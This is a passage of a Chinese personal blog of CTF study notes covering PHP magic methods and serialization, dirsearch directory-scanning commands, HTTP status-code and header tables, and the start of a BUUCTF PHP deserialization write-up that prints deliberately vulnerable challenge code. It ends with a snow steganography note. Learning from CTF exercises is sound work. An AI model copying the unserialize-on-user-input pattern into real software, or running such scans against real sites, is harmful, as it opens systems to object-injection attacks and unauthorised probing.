invoke__">__callStatic</span>()           <span class="comment">//在静态上下文中调用不可访问的方法时触发</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">__get</span>()                  <span class="comment">//读取不可访问属性的值时，这里的不可访问包含私有属性或未定义</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">__set</span>()                  <span class="comment">//在给不可访问属性赋值时触发</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">__isset</span>()                <span class="comment">//当对不可访问属性调用 isset() 或 empty() 时触发</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">__unset</span>()                <span class="comment">//在不可访问的属性上使用unset()时触发</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">__invoke</span>()               <span class="comment">//当尝试以调用函数的方式调用一个对象时触发</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">__sleep</span>()                <span class="comment">//执行serialize()时，先会调用这个方法</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">__wakeup</span>()               <span class="comment">//执行unserialize()时，先会调用这个方法</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">__toString</span>()             <span class="comment">//当反序列化后的对象被输出在模板中的时候（转换成字符串的时候）自动调用</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h5 id="2-序列化"><a href="#2-序列化" class="headerlink" title="2.序列化"></a>2.序列化</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="comment">//类的数据</span></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$age</span> = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="comment">//输出数据</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">printdata</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;User &#x27;</span>.<span class="variable language_">$this</span>-&gt;name.<span class="string">&#x27; is &#x27;</span>.<span class="variable language_">$this</span>-&gt;age.<span class="string">&#x27; years old.&lt;br /&gt;&#x27;</span>;</span><br><span class="line">    &#125; <span class="comment">// “.”表示字符串连接</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//创建一个对象</span></span><br><span class="line"><span class="variable">$usr</span> = <span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line"><span class="comment">//设置数据</span></span><br><span class="line"><span class="variable">$usr</span>-&gt;age = <span class="number">18</span>;</span><br><span class="line"><span class="variable">$usr</span>-&gt;name = <span class="string">&#x27;Hardworking666&#x27;</span>;</span><br><span class="line"><span class="comment">//输出数据</span></span><br><span class="line"><span class="variable">$usr</span>-&gt;<span class="title function_ invoke__">printdata</span>();</span><br><span class="line"><span class="comment">//输出序列化后的数据</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$usr</span>)</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>输出结果</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">User Hardworking666 is <span class="number">18</span> years old.</span><br><span class="line">O:<span class="number">4</span>:<span class="string">&quot;User&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">3</span>:<span class="string">&quot;age&quot;</span>;i:<span class="number">18</span>;s:<span class="number">4</span>:<span class="string">&quot;name&quot;</span>;s:<span class="number">14</span>:<span class="string">&quot;Hardworking666&quot;</span>;&#125;</span><br></pre></td></tr></table></figure>

<p>序列化格式</p>
<h4 id="四-dirsearch用法"><a href="#四-dirsearch用法" class="headerlink" title="四.dirsearch用法"></a>四.dirsearch用法</h4><p>python dirsearch.py -u <a target="_blank" rel="noopener" href="http://xxxx/">http://xxxx</a>      就OK了</p>
<p>再高级一点就是加上网站语言，</p>
<p>python dirsearch.py -u <a target="_blank" rel="noopener" href="http://xxxx/">http://xxxx</a> -e php          -e 后面接网站语言，这里php做例子。</p>
<p>还有在高级点的就是</p>
<p>  python dirsearch.py -u <a target="_blank" rel="noopener" href="http://xxxx/">http://xxxx</a> -w 指定字典</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python dirsearch.py -u http://ca4aba23-6dea-4a70-9bf8-3208c5714f83.node5.buuoj.cn -w db/dicc.txt</span><br></pre></td></tr></table></figure>

<p>  python dirsearch.py -u <a target="_blank" rel="noopener" href="http://xxxx/">http://xxxx</a> -r 递归目录（跑出目录后，继续跑目录下面的目录）<br>  python dirsearch.py -u <a target="_blank" rel="noopener" href="http://xxxx/">http://xxxx</a> –random-agents 使用随机UA</p>
<h4 id="五-HTTP"><a href="#五-HTTP" class="headerlink" title="五.HTTP"></a>五.HTTP</h4><h5 id="http状态码"><a href="#http状态码" class="headerlink" title="http状态码"></a>http状态码</h5><p>当浏览者访问一个网页时，浏览者的浏览器会向网页所在服务器发出请求。当浏览器接收并显示网页前，此网页所在的服务器会返回一个包含 HTTP 状态码的信息头（server header）用以响应浏览器的请求。</p>
<p>HTTP 状态码的英文为 <strong>HTTP Status Code</strong>。。</p>
<p>下面是常见的 HTTP 状态码：</p>
<ul>
<li>200 - 请求成功</li>
<li>301 - 资源（网页等）被永久转移到其它URL</li>
<li>404 - 请求的资源（网页等）不存在</li>
<li>500 - 内部服务器错误</li>
</ul>
<h5 id="HTTP-状态码分类"><a href="#HTTP-状态码分类" class="headerlink" title="HTTP 状态码分类"></a>HTTP 状态码分类</h5><p>HTTP 状态码由三个十进制数字组成，第一个十进制数字定义了状态码的类型。响应分为五类：信息响应(100–199)，成功响应(200–299)，重定向(300–399)，客户端错误(400–499)和服务器错误 (500–599)：</p>
<table>
<thead>
<tr>
<th align="left">分类</th>
<th align="left">分类描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left">1**</td>
<td align="left">信息，服务器收到请求，需要请求者继续执行操作</td>
</tr>
<tr>
<td align="left">2**</td>
<td align="left">成功，操作被成功接收并处理</td>
</tr>
<tr>
<td align="left">3**</td>
<td align="left">重定向，需要进一步的操作以完成请求</td>
</tr>
<tr>
<td align="left">4**</td>
<td align="left">客户端错误，请求包含语法错误或无法完成请求</td>
</tr>
<tr>
<td align="left">5**</td>
<td align="left">服务器错误，服务器在处理请求的过程中发生了错误</td>
</tr>
</tbody></table>
<p>HTTP状态码列表:</p>
<table>
<thead>
<tr>
<th align="left">状态码</th>
<th align="left">状态码英文名称</th>
<th align="left">中文描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left">100</td>
<td align="left">Continue</td>
<td align="left">继续。客户端应继续其请求</td>
</tr>
<tr>
<td align="left">101</td>
<td align="left">Switching Protocols</td>
<td align="left">切换协议。服务器根据客户端的请求切换协议。只能切换到更高级的协议，例如，切换到HTTP的新版本协议</td>
</tr>
<tr>
<td align="left"></td>
<td align="left"></td>
<td align="left"></td>
</tr>
<tr>
<td align="left">200</td>
<td align="left">OK</td>
<td align="left">请求成功。一般用于GET与POST请求</td>
</tr>
<tr>
<td align="left">201</td>
<td align="left">Created</td>
<td align="left">已创建。成功请求并创建了新的资源</td>
</tr>
<tr>
<td align="left">202</td>
<td align="left">Accepted</td>
<td align="left">已接受。已经接受请求，但未处理完成</td>
</tr>
<tr>
<td align="left">203</td>
<td align="left">Non-Authoritative Information</td>
<td align="left">非授权信息。请求成功。但返回的meta信息不在原始的服务器，而是一个副本</td>
</tr>
<tr>
<td align="left">204</td>
<td align="left">No Content</td>
<td align="left">无内容。服务器成功处理，但未返回内容。在未更新网页的情况下，可确保浏览器继续显示当前文档</td>
</tr>
<tr>
<td align="left">205</td>
<td align="left">Reset Content</td>
<td align="left">重置内容。服务器处理成功，用户终端（例如：浏览器）应重置文档视图。可通过此返回码清除浏览器的表单域</td>
</tr>
<tr>
<td align="left">206</td>
<td align="left">Partial Content</td>
<td align="left">部分内容。服务器成功处理了部分GET请求</td>
</tr>
<tr>
<td align="left"></td>
<td align="left"></td>
<td align="left"></td>
</tr>
<tr>
<td align="left">300</td>
<td align="left">Multiple Choices</td>
<td align="left">多种选择。请求的资源可包括多个位置，相应可返回一个资源特征与地址的列表用于用户终端（例如：浏览器）选择</td>
</tr>
<tr>
<td align="left">301</td>
<td align="left">Moved Permanently</td>
<td align="left">永久移动。请求的资源已被永久的移动到新URI，返回信息会包括新的URI，浏览器会自动定向到新URI。今后任何新的请求都应使用新的URI代替</td>
</tr>
<tr>
<td align="left">302</td>
<td align="left">Found</td>
<td align="left">临时移动。与301类似。但资源只是临时被移动。客户端应继续使用原有URI</td>
</tr>
<tr>
<td align="left">303</td>
<td align="left">See Other</td>
<td align="left">查看其它地址。与301类似。使用GET和POST请求查看</td>
</tr>
<tr>
<td align="left">304</td>
<td align="left">Not Modified</td>
<td align="left">未修改。所请求的资源未修改，服务器返回此状态码时，不会返回任何资源。客户端通常会缓存访问过的资源，通过提供一个头信息指出客户端希望只返回在指定日期之后修改的资源</td>
</tr>
<tr>
<td align="left">305</td>
<td align="left">Use Proxy</td>
<td align="left">使用代理。所请求的资源必须通过代理访问</td>
</tr>
<tr>
<td align="left">306</td>
<td align="left">Unused</td>
<td align="left">已经被废弃的HTTP状态码</td>
</tr>
<tr>
<td align="left">307</td>
<td align="left">Temporary Redirect</td>
<td align="left">临时重定向。与302类似。使用GET请求重定向</td>
</tr>
<tr>
<td align="left"></td>
<td align="left"></td>
<td align="left"></td>
</tr>
<tr>
<td align="left">400</td>
<td align="left">Bad Request</td>
<td align="left">客户端请求的语法错误，服务器无法理解</td>
</tr>
<tr>
<td align="left">401</td>
<td align="left">Unauthorized</td>
<td align="left">请求要求用户的身份认证</td>
</tr>
<tr>
<td align="left">402</td>
<td align="left">Payment Required</td>
<td align="left">保留，将来使用</td>
</tr>
<tr>
<td align="left">403</td>
<td align="left">Forbidden</td>
<td align="left">服务器理解请求客户端的请求，但是拒绝执行此请求</td>
</tr>
<tr>
<td align="left">404</td>
<td align="left">Not Found</td>
<td align="left">服务器无法根据客户端的请求找到资源（网页）。通过此代码，网站设计人员可设置”您所请求的资源无法找到”的个性页面</td>
</tr>
<tr>
<td align="left">405</td>
<td align="left">Method Not Allowed</td>
<td align="left">客户端请求中的方法被禁止</td>
</tr>
<tr>
<td align="left">406</td>
<td align="left">Not Acceptable</td>
<td align="left">服务器无法根据客户端请求的内容特性完成请求</td>
</tr>
<tr>
<td align="left">407</td>
<td align="left">Proxy Authentication Required</td>
<td align="left">请求要求代理的身份认证，与401类似，但请求者应当使用代理进行授权</td>
</tr>
<tr>
<td align="left">408</td>
<td align="left">Request Time-out</td>
<td align="left">服务器等待客户端发送的请求时间过长，超时</td>
</tr>
<tr>
<td align="left">409</td>
<td align="left">Conflict</td>
<td align="left">服务器完成客户端的 PUT 请求时可能返回此代码，服务器处理请求时发生了冲突</td>
</tr>
<tr>
<td align="left">410</td>
<td align="left">Gone</td>
<td align="left">客户端请求的资源已经不存在。410不同于404，如果资源以前有现在被永久删除了可使用410代码，网站设计人员可通过301代码指定资源的新位置</td>
</tr>
<tr>
<td align="left">411</td>
<td align="left">Length Required</td>
<td align="left">服务器无法处理客户端发送的不带Content-Length的请求信息</td>
</tr>
<tr>
<td align="left">412</td>
<td align="left">Precondition Failed</td>
<td align="left">客户端请求信息的先决条件错误</td>
</tr>
<tr>
<td align="left">413</td>
<td align="left">Request Entity Too Large</td>
<td align="left">由于请求的实体过大，服务器无法处理，因此拒绝请求。为防止客户端的连续请求，服务器可能会关闭连接。如果只是服务器暂时无法处理，则会包含一个Retry-After的响应信息</td>
</tr>
<tr>
<td align="left">414</td>
<td align="left">Request-URI Too Large</td>
<td align="left">请求的URI过长（URI通常为网址），服务器无法处理</td>
</tr>
<tr>
<td align="left">415</td>
<td align="left">Unsupported Media Type</td>
<td align="left">服务器无法处理请求附带的媒体格式</td>
</tr>
<tr>
<td align="left">416</td>
<td align="left">Requested range not satisfiable</td>
<td align="left">客户端请求的范围无效</td>
</tr>
<tr>
<td align="left">417</td>
<td align="left">Expectation Failed</td>
<td align="left">服务器无法满足Expect的请求头信息</td>
</tr>
<tr>
<td align="left"></td>
<td align="left"></td>
<td align="left"></td>
</tr>
<tr>
<td align="left">500</td>
<td align="left">Internal Server Error</td>
<td align="left">服务器内部错误，无法完成请求</td>
</tr>
<tr>
<td align="left">501</td>
<td align="left">Not Implemented</td>
<td align="left">服务器不支持请求的功能，无法完成请求</td>
</tr>
<tr>
<td align="left">502</td>
<td align="left">Bad Gateway</td>
<td align="left">作为网关或者代理工作的服务器尝试执行请求时，从远程服务器接收到了一个无效的响应</td>
</tr>
<tr>
<td align="left">503</td>
<td align="left">Service Unavailable</td>
<td align="left">由于超载或系统维护，服务器暂时的无法处理客户端的请求。延时的长度可包含在服务器的Retry-After头信息中</td>
</tr>
<tr>
<td align="left">504</td>
<td align="left">Gateway Time-out</td>
<td align="left">充当网关或代理的服务器，未及时从远端服务器获取请求</td>
</tr>
<tr>
<td align="left">505</td>
<td align="left">HTTP Version not supported</td>
<td align="left">服务器不支持请求的HTTP协议的版本，无法完成处理</td>
</tr>
</tbody></table>
<h5 id="HTTP-请求方法"><a href="#HTTP-请求方法" class="headerlink" title="HTTP 请求方法"></a>HTTP 请求方法</h5><p>根据 HTTP 标准，HTTP 请求可以使用多种请求方法。</p>
<p>HTTP1.0 定义了三种请求方法： GET, POST 和 HEAD 方法。</p>
<p>HTTP1.1 新增了六种请求方法：OPTIONS、PUT、PATCH、DELETE、TRACE 和 CONNECT 方法。</p>
<table>
<thead>
<tr>
<th align="left">序号</th>
<th align="left">方法</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left">1</td>
<td align="left">GET</td>
<td align="left">请求指定的页面信息，并返回实体主体。</td>
</tr>
<tr>
<td align="left">2</td>
<td align="left">HEAD</td>
<td align="left">类似于 GET 请求，只不过返回的响应中没有具体的内容，用于获取报头</td>
</tr>
<tr>
<td align="left">3</td>
<td align="left">POST</td>
<td align="left">向指定资源提交数据进行处理请求（例如提交表单或者上传文件）。数据被包含在请求体中。POST 请求可能会导致新的资源的建立和&#x2F;或已有资源的修改。</td>
</tr>
<tr>
<td align="left">4</td>
<td align="left">PUT</td>
<td align="left">从客户端向服务器传送的数据取代指定的文档的内容。</td>
</tr>
<tr>
<td align="left">5</td>
<td align="left">DELETE</td>
<td align="left">请求服务器删除指定的页面。</td>
</tr>
<tr>
<td align="left">6</td>
<td align="left">CONNECT</td>
<td align="left">HTTP&#x2F;1.1 协议中预留给能够将连接改为管道方式的代理服务器。</td>
</tr>
<tr>
<td align="left">7</td>
<td align="left">OPTIONS</td>
<td align="left">允许客户端查看服务器的性能。</td>
</tr>
<tr>
<td align="left">8</td>
<td align="left">TRACE</td>
<td align="left">回显服务器收到的请求，主要用于测试或诊断。</td>
</tr>
<tr>
<td align="left">9</td>
<td align="left">PATCH</td>
<td align="left">是对 PUT 方法的补充，用来对已知资源进行局部更新 。</td>
</tr>
</tbody></table>
<h5 id="HTTP-响应头信息"><a href="#HTTP-响应头信息" class="headerlink" title="HTTP 响应头信息"></a>HTTP 响应头信息</h5><p>HTTP请求头提供了关于请求，响应或者其他的发送实体的信息。</p>
<p>在本章节中我们将具体来介绍HTTP响应头信息。</p>
<table>
<thead>
<tr>
<th align="left">应答头</th>
<th align="left">说明</th>
</tr>
</thead>
<tbody><tr>
<td align="left">Allow</td>
<td align="left">服务器支持哪些请求方法（如GET、POST等）。</td>
</tr>
<tr>
<td align="left">Content-Encoding</td>
<td align="left">文档的编码（Encode）方法。只有在解码之后才可以得到Content-Type头指定的内容类型。利用gzip压缩文档能够显著地减少HTML文档的下载时间。Java的GZIPOutputStream可以很方便地进行gzip压缩，但只有Unix上的Netscape和Windows上的IE 4、IE 5才支持它。因此，Servlet应该通过查看Accept-Encoding头（即request.getHeader(“Accept-Encoding”)）检查浏览器是否支持gzip，为支持gzip的浏览器返回经gzip压缩的HTML页面，为其他浏览器返回普通页面。</td>
</tr>
<tr>
<td align="left">Content-Length</td>
<td align="left">表示内容长度。只有当浏览器使用持久HTTP连接时才需要这个数据。如果你想要利用持久连接的优势，可以把输出文档写入 ByteArrayOutputStream，完成后查看其大小，然后把该值放入Content-Length头，最后通过byteArrayStream.writeTo(response.getOutputStream()发送内容。</td>
</tr>
<tr>
<td align="left">Content-Type</td>
<td align="left">表示后面的文档属于什么MIME类型。Servlet默认为text&#x2F;plain，但通常需要显式地指定为text&#x2F;html。由于经常要设置Content-Type，因此HttpServletResponse提供了一个专用的方法setContentType。</td>
</tr>
<tr>
<td align="left">Date</td>
<td align="left">当前的GMT时间。你可以用setDateHeader来设置这个头以避免转换时间格式的麻烦。</td>
</tr>
<tr>
<td align="left">Expires</td>
<td align="left">应该在什么时候认为文档已经过期，从而不再缓存它？</td>
</tr>
<tr>
<td align="left">Last-Modified</td>
<td align="left">文档的最后改动时间。客户可以通过If-Modified-Since请求头提供一个日期，该请求将被视为一个条件GET，只有改动时间迟于指定时间的文档才会返回，否则返回一个304（Not Modified）状态。Last-Modified也可用setDateHeader方法来设置。</td>
</tr>
<tr>
<td align="left">Location</td>
<td align="left">表示客户应当到哪里去提取文档。Location通常不是直接设置的，而是通过HttpServletResponse的sendRedirect方法，该方法同时设置状态代码为302。</td>
</tr>
<tr>
<td align="left">Refresh</td>
<td align="left">表示浏览器应该在多少时间之后刷新文档，以秒计。除了刷新当前文档之外，你还可以通过setHeader(“Refresh”, “5; URL&#x3D;<a target="_blank" rel="noopener" href="http://host/path%22)%E8%AE%A9%E6%B5%8F%E8%A7%88%E5%99%A8%E8%AF%BB%E5%8F%96%E6%8C%87%E5%AE%9A%E7%9A%84%E9%A1%B5%E9%9D%A2%E3%80%82">http://host/path&quot;)让浏览器读取指定的页面。</a> 注意这种功能通常是通过设置HTML页面HEAD区的＜META HTTP-EQUIV&#x3D;”Refresh” CONTENT&#x3D;”5;URL&#x3D;<a target="_blank" rel="noopener" href="http://host/path%22%EF%BC%9E%E5%AE%9E%E7%8E%B0%EF%BC%8C%E8%BF%99%E6%98%AF%E5%9B%A0%E4%B8%BA%EF%BC%8C%E8%87%AA%E5%8A%A8%E5%88%B7%E6%96%B0%E6%88%96%E9%87%8D%E5%AE%9A%E5%90%91%E5%AF%B9%E4%BA%8E%E9%82%A3%E4%BA%9B%E4%B8%8D%E8%83%BD%E4%BD%BF%E7%94%A8CGI%E6%88%96Servlet%E7%9A%84HTML%E7%BC%96%E5%86%99%E8%80%85%E5%8D%81%E5%88%86%E9%87%8D%E8%A6%81%E3%80%82%E4%BD%86%E6%98%AF%EF%BC%8C%E5%AF%B9%E4%BA%8EServlet%E6%9D%A5%E8%AF%B4%EF%BC%8C%E7%9B%B4%E6%8E%A5%E8%AE%BE%E7%BD%AERefresh%E5%A4%B4%E6%9B%B4%E5%8A%A0%E6%96%B9%E4%BE%BF%E3%80%82">http://host/path&quot;＞实现，这是因为，自动刷新或重定向对于那些不能使用CGI或Servlet的HTML编写者十分重要。但是，对于Servlet来说，直接设置Refresh头更加方便。</a>  注意Refresh的意义是”N秒之后刷新本页面或访问指定页面”，而不是”每隔N秒刷新本页面或访问指定页面”。因此，连续刷新要求每次都发送一个Refresh头，而发送204状态代码则可以阻止浏览器继续刷新，不管是使用Refresh头还是＜META HTTP-EQUIV&#x3D;”Refresh” …＞。  注意Refresh头不属于HTTP 1.1正式规范的一部分，而是一个扩展，但Netscape和IE都支持它。</td>
</tr>
<tr>
<td align="left">Server</td>
<td align="left">服务器名字。Servlet一般不设置这个值，而是由Web服务器自己设置。</td>
</tr>
<tr>
<td align="left">Set-Cookie</td>
<td align="left">设置和页面关联的Cookie。Servlet不应使用response.setHeader(“Set-Cookie”, …)，而是应使用HttpServletResponse提供的专用方法addCookie。参见下文有关Cookie设置的讨论。</td>
</tr>
<tr>
<td align="left">WWW-Authenticate</td>
<td align="left">客户应该在Authorization头中提供什么类型的授权信息？在包含401（Unauthorized）状态行的应答中这个头是必需的。例如，response.setHeader(“WWW-Authenticate”, “BASIC realm&#x3D;＼”executives＼””)。 注意Servlet一般不进行这方面的处理，而是让Web服务器的专门机制来控制受密码保护页面的访问（例如.htaccess）。</td>
</tr>
</tbody></table>
<h4 id="buuctf-PHP【极客大挑战】"><a href="#buuctf-PHP【极客大挑战】" class="headerlink" title="buuctf PHP【极客大挑战】"></a>buuctf PHP【极客大挑战】</h4><p><img src="/2023/09/28/web%E5%AD%A6%E4%B9%A0/Users\tong\AppData\Roaming\Typora\typora-user-images\image-20240409133715947.png" alt="image-20240409133715947"></p>
<p>dirsearch 扫后台备份文件  <a target="_blank" rel="noopener" href="http://www.zip/">www.zip</a></p>
<p>index.php  :页面传入了一个select参数并把他反序列化</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">include</span> <span class="string">&#x27;class.php&#x27;</span>;</span><br><span class="line">    <span class="variable">$select</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;select&#x27;</span>];</span><br><span class="line">    <span class="variable">$res</span>=<span class="title function_ invoke__">unserialize</span>(@<span class="variable">$select</span>);</span><br><span class="line">    <span class="meta">?&gt;</span></span><br><span class="line">        </span><br><span class="line"> <span class="comment">/*</span></span><br><span class="line"><span class="comment">1.include &#x27;class.php&#x27;;：这行代码用于引入文件class.php，该文件中包含了一个类的定义或其他相关的代码。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">2.$select = $_GET[&#x27;select&#x27;];：这行代码将HTTP GET请求中名为select的参数的值赋给变量$select。$_GET是一个包含了所有通过GET方法发送到当前脚本的参数和值的全局数组。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">3.$res=unserialize(@$select);：这行代码将变量$select的值进行反序列化，并将结果赋给变量$res。unserialize()函数用于将之前通过serialize()函数序列化的字符串转换回原始的PHP数据类型。@符号用于抑制可能出现的反序列化错误。</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>



<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Name</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$username</span> = <span class="string">&#x27;nonono&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$password</span> = <span class="string">&#x27;yesyes&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$username</span>,<span class="variable">$password</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username = <span class="variable">$username</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password = <span class="variable">$password</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username = <span class="string">&#x27;guest&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;password != <span class="number">100</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;NO!!!hacker!!!&lt;/br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;You name is: &quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;username;<span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;You password is: &quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;password;<span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">die</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;username === <span class="string">&#x27;admin&#x27;</span>) &#123;</span><br><span class="line">            <span class="keyword">global</span> <span class="variable">$flag</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$flag</span>;<span class="comment">//当用户名为 &#x27;admin&#x27; 时，输出全局变量 $flag 的值</span></span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;hello my friend~~&lt;/br&gt;sorry i can&#x27;t give you the flag!&quot;</span>;</span><br><span class="line">            <span class="keyword">die</span>();</span><br><span class="line"></span><br><span class="line">            </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>


      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2023/09/27/misc/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="John Doe">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="tyc的小窝">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/09/27/misc/" class="post-title-link" itemprop="url">Misc</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2023-09-27 16:21:55" itemprop="dateCreated datePublished" datetime="2023-09-27T16:21:55+08:00">2023-09-27</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2025-01-10 18:30:08" itemprop="dateModified" datetime="2025-01-10T18:30:08+08:00">2025-01-10</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h5 id="我的壁纸"><a href="#我的壁纸" class="headerlink" title="我的壁纸"></a>我的壁纸</h5><p>1.图片分离得到一个压缩包，一个文本一个图片，一个音频，压缩包有个注释snowday,是snow隐写的密钥</p>
<p>对flag.txt解snow得一部分flag</p>
<p>2.音频解SSTV得二维码，解二维码的部分flag</p>
<p>3.图片的备注信息里有一个password,尝试steghide解出另外一部分flag</p>
<h4 id="snow隐写"><a href="#snow隐写" class="headerlink" title="snow隐写"></a>snow隐写</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SNOW.EXE  -C -p 他朝若是同淋雪  flag.txt</span><br></pre></td></tr></table></figure>



